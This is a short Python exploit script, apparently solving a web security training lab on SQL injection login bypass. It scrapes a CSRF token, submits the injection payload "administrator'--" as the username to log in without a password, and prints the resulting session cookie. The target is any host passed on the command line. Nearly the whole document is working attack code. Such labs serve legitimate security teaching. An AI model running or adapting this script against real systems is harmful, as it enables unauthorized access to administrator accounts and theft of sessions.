# Lab: SQL injection vulnerability allowing login bypass

import requests
from bs4 import BeautifulSoup
import argparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Get CSRF token
def get_csrf_token():
    url = target_url + "/login"

    out = r.get(url, proxies=proxies, verify=False)
    if out.status_code == 200:
        soup = BeautifulSoup(out.text,features="html.parser")
        csrf_token = soup.find('input', {'name': 'csrf'}).get('value')

        print("[+] Got the CSRF Token: ", csrf_token)
        return csrf_token

# SQLi to bypass login
def sql_injection(csrf_token):
    url = target_url + "/login"

    payload = "administrator'--"

    data = {
        'csrf':csrf_token,
        'username':payload,
        'password':'random'
    }

    out = r.post(url, data = data, proxies=proxies, verify=False, allow_redirects=False)
    if out.status_code == 302:
        session_cookie = out.headers['Set-Cookie']
        print("[+] Exploited")
        print("[+] Session Cookies is: ", session_cookie)

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True)
    args = parser.parse_args()

    r = requests.Session()
    target_url = args.host
    proxies = {
        'https':'http://127.0.0.1:8080',
        'http':'http://127.0.0.1:8080'
    }
    
    csrf_token = get_csrf_token()
    sql_injection(csrf_token)